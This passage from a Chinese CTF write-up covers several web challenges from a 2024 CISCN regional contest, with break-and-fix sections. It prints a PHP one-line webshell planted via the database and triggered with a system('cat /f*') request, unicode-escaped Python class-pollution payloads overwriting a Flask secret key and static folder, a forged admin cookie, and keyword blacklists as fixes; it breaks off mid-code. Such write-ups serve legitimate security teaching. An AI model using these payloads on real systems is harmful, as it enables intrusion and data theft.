+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="title function_ invoke__">reval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>base64编码一下就是payload</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706103833600.png"></p>
+<p>注意这里<code>\r</code>不能直接用cyberchef按字符加密</p>
+<p>我们可以将上述加密解码一下</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706104121502.png"></p>
+<p>我们在edit.php输入我们要修改的payload，然后访问home.php成功写入一句话木马到数据库</p>
+<p>最后就是在config.php与数据库进行交互操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$db_name = &#x27;ctf&#x27;;</span><br><span class="line">$db_user = &#x27;root&#x27;;</span><br><span class="line">$db_pwd = &#x27;root&#x27;;</span><br><span class="line">$dsn = &quot;mysql:host=$db_host;dbname=$db_name&quot;;</span><br><span class="line">$pdo = new PDO($dsn,$db_user,$db_pwd);</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/config?1=system(&#39;cat /f*&#39;);</code>即可得到flag</p>
+<h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>上述攻击手段是通过写入一句话木马到数据库</p>
+<p>那么我们可以删掉写数据库操作即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h2><h3 id="BREAK-2"><a href="#BREAK-2" class="headerlink" title="BREAK"></a>BREAK</h3><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for,request,render_template</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    return md5_hash.hexdigest()</span><br><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=True, port=80)</span><br></pre></td></tr></table></figure>
+
+<p>存在merge函数那么考点肯定是python原型链污染</p>
+<p>首先定义了<code>secret_key</code>，使用os.urandom函数生成随机数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line">    </span><br><span class="line">app.secret_key = generate_random_md5()</span><br></pre></td></tr></table></figure>
+
+<p>定义了黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br></pre></td></tr></table></figure>
+
+<p>json格式数据可以用unicode编码，所以这里关键字都可以绕过</p>
+<p>定义了evil类，初始化的作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+
+<p><code>/</code>路由下POST传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>接收username和password，并赋值给session。然后evil初始化，对传参的值黑名单检测（unicode绕过）</p>
+<p>如果未检测到则执行merge函数，存在原型链污染漏洞</p>
+<p><code>/admin</code>路由如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>检测session中的username和password是否正确，正确则返回flag</p>
+<p><strong>思路</strong></p>
+<p>由于得到flag的条件非常苛刻，因为我们根本无法确定<code>secret_key</code>的值，所以我们选择污染key，然后利用<code>/</code>路由下的对session赋值，得到<code>adminer:123456</code>的cookie，再拿此cookie去访问<code>/admin</code>即可实现绕过</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>污染成功后，登录<code>adminer:123456</code>拿cookie，然后访问<code>/admin</code></p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623115809810.png"></p>
+<p>发现没有flag，想到还有个知识点 <code>_static_folder</code>  是用于指定静态文件的存放路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;_static_folder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;\u005fstatic\u005ffolder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>污染成功后我们直接访问静态路由<code>10.1.180.19/static/flag</code>，成功拿到flag</p>
+<h3 id="FIX-2"><a href="#FIX-2" class="headerlink" title="FIX"></a>FIX</h3><p>直接添加对unicode的waf，以及读取静态路由的关键字<code>_static_folder</code></p>
+<p>原来黑名单修改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;_static_folder&#x27;,&#x27;\u005f&#x27;, &#x27;\u0069&#x27;, &#x27;\u0061&#x27;, &#x27;\u004&#x27;,&#x27;\u0067&#x27;,&#x27;\u006c&#x27;,&#x27;\u006f&#x27;,&#x27;\u0062&#x27;,&#x27;\u0063&#x27;,&#x27;\u0064&#x27;,&#x27;\u006c&#x27;,&#x27;\u0073&#x27;, &#x27;\u0065&#x27;, &#x27;\u0066&#x27;, &#x27;\u0068&#x27;,&#x27;\u0074&#x27;,&#x27;\u006d&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>
+
+<p>不过一直修到最后一轮还是没成功，赛后才想到这里的<code>\</code>要转义，应该是<code>\\u0061</code>这样</p>
+<p>其实也不用那么复杂</p>
+<p>对unicode的过滤直接过滤<code>\</code>就行，关键字拆开过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;static&#x27;, &#x27;folder&#x27;,&#x27;\&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>
+
+<p>比赛的时候只能说脑袋给烧晕了，最简单的修复都没想到</p>
+<h2 id="bigfish"><a href="#bigfish" class="headerlink" title="bigfish"></a>bigfish</h2><h3 id="BREAK-3"><a href="#BREAK-3" class="headerlink" title="BREAK"></a>BREAK</h3><p>访问admin路由的时候发现出现了<code>set-cookie</code>，给了两个cookie：<code>is_admin=false</code>和<code>username</code></p>
+<p>尝试修改为<code>Cookie: is_admin=true;username=admin</code>成功登录</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706105234987.png"></p>
+<p>尝试路径穿越发现根本读取不到其他文件</p>
+<p>审计一下fish.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> schedule = <span class="built_in">require</span>(<span class="string">&#x27;node-schedule&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change working directory to /srv</span></span><br><span class="line">process.<span class="title function_">chdir</span>(<span class="string">&#x27;/srv&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rule1 = <span class="keyword">new</span> schedule.<span class="title class_">RecurrenceRule</span>();</span><br><span class="line">rule1.<span class="property">minute</span> = [<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span> , <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">36</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">45</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">57</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时清除</span></span><br><span class="line"><span class="keyword">let</span> job1 = schedule.<span class="title function_">scheduleJob</span>(rule1, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;data.html&#x27;</span>,<span class="string">&quot;#获取的数据信息\n&quot;</span>,<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wriet error&quot;</span>)</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;express-art-template&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data_path = <span class="string">&quot;data.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware to set default cookies for /admin route</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setDefaultAdminCookies</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;normal&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">is_admin</span>) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;is_admin&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主页</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">	fs.<span class="title function_">appendFile</span>(<span class="string">&#x27;data.html&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>)+<span class="string">&quot;\n&quot;</span>,<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">	&#125;);</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//后台管理</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;admin.html&#x27;</span>,&#123;</span><br><span class="line">            datadir : data_path</span><br><span class="line">        &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">newname</span>)&#123;</span><br><span class="line">			data_path = req.<span class="property">body</span>.<span class="property">newname</span>;</span><br><span class="line">			res.<span class="title function_">redirect</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			res.<span class="title function_">redirect</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//已弃用的登录</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span 